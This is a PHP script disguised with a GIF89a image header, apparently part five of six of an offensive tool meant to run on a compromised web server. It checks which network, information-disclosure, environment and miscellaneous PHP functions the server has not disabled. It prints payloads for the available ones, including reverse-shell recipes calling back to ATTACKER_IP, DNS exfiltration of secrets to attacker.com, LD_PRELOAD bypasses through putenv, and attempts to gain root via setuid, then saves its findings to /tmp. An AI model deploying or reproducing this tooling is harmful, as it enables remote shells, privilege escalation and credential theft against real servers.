GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
$o = '';

$o .= "============================================================\n";
$o .= "  PART 5/6 - Network + Info Disclosure + Environment + Misc\n";
$o .= "============================================================\n\n";

$o .= "====== 8. Network Functions [HIGH] ======\n";
$o .= "Reverse shells, SSRF, data exfiltration, PHP-FPM poisoning\n\n";
$nets = array(
    'fsockopen' => array(
        "\$s=fsockopen('ATTACKER_IP',4444);",
        'TCP/UDP connection - reverse shell backbone. Also used for PHP-FPM bypass.'
    ),
    'pfsockopen' => array(
        "// persistent version of fsockopen",
        'Persistent socket - stays open between requests'
    ),
    'stream_socket_client' => array(
        "\$s=stream_socket_client('tcp://ATTACKER:4444');",
        'Alternative TCP - more features than fsockopen'
    ),
    'stream_socket_server' => array(
        "\$s=stream_socket_server('tcp://0.0.0.0:1234');",
        'Create listening socket (bind shell)'
    ),
    'stream_socket_sendto' => array(
        "// send data over existing socket",
        'Send data to socket'
    ),
    'curl_exec' => array(
        "\$ch=curl_init('http://internal:8080'); curl_setopt(\$ch,CURLOPT_RETURNTRANSFER,1); echo curl_exec(\$ch);",
        'HTTP requests - SSRF to internal services!'
    ),
    'curl_multi_exec' => array(
        "// parallel HTTP requests",
        'Multiple concurrent requests'
    ),
    'dns_get_record' => array(
        "dns_get_record(base64_encode(\$secret).'.attacker.com','A');",
        'DNS exfiltration - bypasses most firewalls!'
    ),
);
foreach ($nets as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[1]}\n";
    if (ok($f) && strpos($info[0],'//')!==0) $o .= "           Payload: {$info[0]}\n";
    $o .= "\n";
}

// Reverse shell recipes
if (ok('fsockopen') || ok('stream_socket_client')) {
    $o .= "--- REVERSE SHELL RECIPES ---\n\n";
    if (ok('fsockopen')) {
        $o .= "  [*] fsockopen + proc_open (if available):\n";
        $o .= "      \$s=fsockopen('IP',4444);\n";
        $o .= "      proc_open('/bin/sh -i',[0=>\$s,1=>\$s,2=>\$s],\$p);\n\n";
        $o .= "  [*] fsockopen + shell_exec (if available):\n";
        $o .= "      \$s=fsockopen('IP',4444);\n";
        $o .= "      while(\$c=fgets(\$s)){fwrite(\$s,shell_exec(\$c));}\n\n";
    }
    if (ok('stream_socket_client')) {
        $o .= "  [*] stream_socket_client alternative:\n";
        $o .= "      \$s=stream_socket_client('tcp://IP:4444');\n";
        $o .= "      while(\$c=fgets(\$s)){fwrite(\$s,shell_exec(\$c));}\n\n";
    }
}

// ============================================================
$o .= "\n====== 9. Information Disclosure [MEDIUM] ======\n";
$o .= "Leak server info, configuration, users, paths\n\n";

$info_funcs = array(
    'phpinfo' => 'Full PHP dump - disable_functions, modules, paths, EVERYTHING',
    'getenv' => 'All environment vars (DB passwords, API keys, secrets!)',
    'get_current_user' => 'Script file owner username',
    'getcwd' => 'Current working directory path',
    'php_uname' => 'OS name, version, hostname, architecture',
    'php_sapi_name' => 'Server API (apache2handler, fpm-fcgi, cli)',
    'ini_get' => 'Read ANY PHP setting value',
    'ini_get_all' => 'ALL PHP settings in one dump',
    'get_loaded_extensions' => 'List all loaded PHP modules',
    'get_defined_functions' => 'Every available function (internal + user)',
    'get_declared_classes' => 'All available PHP classes',
    'get_defined_constants' => 'All PHP constants',
    'get_defined_vars' => 'All variables in current scope',
    'disk_free_space' => 'Free disk space',
    'disk_total_space' => 'Total disk size',
    'posix_getpwuid' => 'User info from UID (enumerate all users)',
    'posix_getpwnam' => 'User info from username',
    'posix_getgrgid' => 'Group info from GID',
    'posix_getlogin' => 'Login name',
    'posix_ttyname' => 'Terminal name',
    'posix_getuid' => 'Current process UID',
    'posix_geteuid' => 'Effective UID',
    'posix_getgid' => 'Current process GID',
    'posix_getgroups' => 'Supplementary group IDs',
    'getmypid' => 'Current process ID',
    'getmyuid' => 'Script owner UID',
    'getmygid' => 'Script owner GID',
    'getlastmod' => 'Last modification time of script',
    'proc_get_status' => 'Process status info',
    'function_exists' => 'Check if specific function exists',
    'class_exists' => 'Check if specific class exists',
    'extension_loaded' => 'Check if extension is loaded',
);

$info_available = 0;
foreach ($info_funcs as $f => $desc) {
    $s = ok($f) ? "[+]" : "[-]";
    $o .= "  $s  $f\n";
    $o .= "           $desc\n";
    if (ok($f)) $info_available++;
}
$o .= "\n  Total info functions available: $info_available/" . count($info_funcs) . "\n";

$o .= "\n  --- QUICK RECON PAYLOAD ---\n";
$o .= "  echo 'User:'.get_current_user().'|CWD:'.getcwd().'|OS:'.php_uname();\n";
$o .= "  echo '|PHP:'.phpversion().'|Disabled:'.ini_get('disable_functions');\n";

// ============================================================
$o .= "\n\n====== 10. Environment & Config Manipulation [HIGH] ======\n";
$o .= "Change PHP settings, overwrite variables, manipulate environment\n\n";

$env = array(
    'putenv' => array(
        "putenv('LD_PRELOAD=/tmp/evil.so');",
        'Set environment variables - KEY for LD_PRELOAD bypass!'
    ),
    'ini_set' => array(
        "ini_set('open_basedir','/'); ini_set('display_errors','1');",
        'Change PHP settings at runtime (some are changeable!)'
    ),
    'ini_alter' => array(
        "// alias of ini_set",
        'Alias of ini_set'
    ),
    'ini_restore' => array(
        "ini_restore('open_basedir');",
        'Restore setting to original php.ini value'
    ),
    'extract' => array(
        "extract(\$_GET);  // ?is_admin=1 overwrites \$is_admin!",
        'Array to variables - register_globals attack! Variable overwrite!'
    ),
    'parse_str' => array(
        "parse_str(\$_SERVER['QUERY_STRING']);  // same risk as extract",
        'Query string to variables - same risk as extract with single arg'
    ),
    'apache_setenv' => array(
        "apache_setenv('LD_PRELOAD','/tmp/evil.so');",
        'Set Apache environment variable - alternative to putenv'
    ),
);
foreach ($env as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[1]}\n";
    if (ok($f) && strpos($info[0],'//')!==0) $o .= "           Payload: {$info[0]}\n";
    $o .= "\n";
}

// ============================================================
$o .= "\n====== 11. Dangerous Misc Functions [MEDIUM-HIGH] ======\n";
$o .= "Deserialization, headers, process control, signals\n\n";
$misc = array(
    'unserialize' => array(
        "unserialize(\$_GET['d']);  // -> POP gadget chain -> RCE",
        'Insecure deserialization - if user controls serialized data = RCE via gadgets'
    ),
    'header' => array(
        "header('Location: '.\$_GET['url']);  // without die() after = code continues!",
        'CRLF injection, open redirect. Code runs AFTER header() without die()!'
    ),
    'mail' => array(
        "mail('','','','','-H \"exec /tmp/shell.sh\"');",
        'CRLF injection in 3rd param + LD_PRELOAD trigger + -X flag for file write'
    ),
    'posix_kill' => array("posix_kill(getmypid(),9);",'Send signal to any process'),
    'posix_mkfifo' => array("posix_mkfifo('/tmp/backpipe',0644);",'Create named pipe for IPC'),
    'posix_setuid' => array("posix_setuid(0);",'Try to change UID to root'),
    'posix_setsid' => array("posix_setsid();",'Create new session (daemonize)'),
    'posix_setpgid' => array("// change process group",'Change process group ID'),
    'proc_nice' => array("proc_nice(-20);",'Change process priority'),
    'proc_terminate' => array("// terminate a process",'Kill process'),
    'proc_close' => array("// close process handle",'Close process'),
    'apache_child_terminate' => array("// kill apache child",'Terminate Apache worker'),
);
foreach ($misc as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[1]}\n";
    if (ok($f) && strpos($info[0],'//')!==0) $o .= "           Payload: {$info[0]}\n";
    $o .= "\n";
}

file_put_contents('/tmp/_audit_p5.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 5/6 saved to /tmp/_audit_p5.txt\n";
?>
